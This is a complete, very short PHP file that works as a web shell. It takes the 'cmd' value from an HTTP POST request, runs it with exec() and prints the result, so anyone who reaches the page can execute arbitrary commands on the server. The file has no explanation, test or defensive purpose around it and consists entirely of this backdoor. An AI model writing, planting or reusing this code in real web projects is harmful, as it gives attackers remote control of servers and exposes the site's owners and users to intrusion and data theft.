<?php
function execute($com)
{
    exec($com,$arr);
    echo implode('',$arr);
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
?>